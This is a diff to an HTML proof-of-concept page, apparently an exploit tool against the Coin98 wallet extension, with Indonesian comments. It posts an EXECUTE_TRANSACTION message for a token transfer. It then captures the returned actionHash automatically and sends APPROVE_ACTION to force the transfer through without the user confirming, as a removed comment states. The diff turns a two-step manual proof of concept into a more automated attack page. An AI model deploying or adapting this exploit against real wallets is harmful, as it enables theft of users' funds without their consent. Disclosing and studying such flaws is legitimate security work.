@@ -1,55 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC: Wallet Authorization Bypass</title>
+    <title>Exploit PoC: Auto-Logger</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        .box { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; }
+        body { font-family: sans-serif; padding: 10px; }
+        .log-box { background: #333; color: #0f0; padding: 10px; font-size: 12px; height: 150px; overflow-y: scroll; margin-top: 10px; }
     </style>
 </head>
 <body>
+    <h3>Coin98 Auto-Exploit Tool</h3>
+    
+    <button id="btnExecute">1. EXECUTE_TRANSACTION</button>
+    <div class="log-box" id="logger">Logs will appear here...</div>
 
-    <div class="box">
-        <h3>1. Langkah Persiapan</h3>
-        <button id="btnExecute">Kirim EXECUTE_TRANSACTION</button>
-        <p><small>Lihat konsol (F12) untuk mendapatkan <b>actionHash</b> dari respons.</small></p>
-    </div>
-
-    <div class="box">
-        <h3>2. Langkah Approval Paksa</h3>
-        <input type="text" id="hashInput" placeholder="Masukkan actionHash di sini" style="width: 250px;">
-        <button id="btnApprove" style="background-color: red; color: white;">APPROVE & EKSEKUSI</button>
+    <div style="margin-top:20px;">
+        <input type="text" id="hashInput" placeholder="Auto-pasted hash" style="width: 100%;">
+        <button id="btnApprove" style="background: red; color: white;">2. APPROVE & EXECUTE</button>
     </div>
 
     <script>
-        // Fungsi pembantu untuk kirim pesan
-        const post = (msg) => window.postMessage(msg, "*");
+        const logger = document.getElementById('logger');
+        const hashInput = document.getElementById('hashInput');
 
-        // 1. Memicu antrean transaksi
+        // Fungsi log ke layar HP
+        const log = (msg) => logger.innerText += "\n" + msg;
+
+        // Mendengarkan pesan balik (respons) dari dompet
+        window.addEventListener("message", (event) => {
+            if (event.data && event.data.type === "EXECUTE_TRANSACTION_RES") {
+                const hash = event.data.data.actionHash;
+                log("DITEMUKAN HASH: " + hash);
+                hashInput.value = hash; // Otomatis mengisi kolom hash!
+            }
+        });
+
         document.getElementById('btnExecute').onclick = () => {
-            const tx = {
+            log("Mengirim EXECUTE...");
+            window.postMessage({
                 type: "EXECUTE_TRANSACTION",
                 data: {
-                    transactions: {
-                        contractAddress: "0x049D...", // Alamat kontrak target
-                        entrypoint: "transfer",
-                        calldata: ["0x...", "1000", "0"]
-                    }
+                    transactions: { contractAddress: "0x...", entrypoint: "transfer", calldata: ["0x...", "1000", "0"] }
                 }
-            };
-            post(tx);
-            console.log("Transaksi dikirim ke antrean. Cari 'actionHash' di respons konsol!");
+            }, "*");
         };
 
-        // 2. Memaksa approval tanpa konfirmasi pengguna
         document.getElementById('btnApprove').onclick = () => {
-            const hash = document.getElementById('hashInput').value;
-            const approve = {
+            log("Mengirim APPROVE...");
+            window.postMessage({
                 type: "APPROVE_ACTION",
-                data: { actionHash: hash }
-            };
-            post(approve);
-            alert("APPROVE_ACTION terkirim. Cek dompet apakah transaksi langsung ter-eksekusi!");
+                data: { actionHash: hashInput.value }
+            }, "*");
         };
     </script>
 </body>
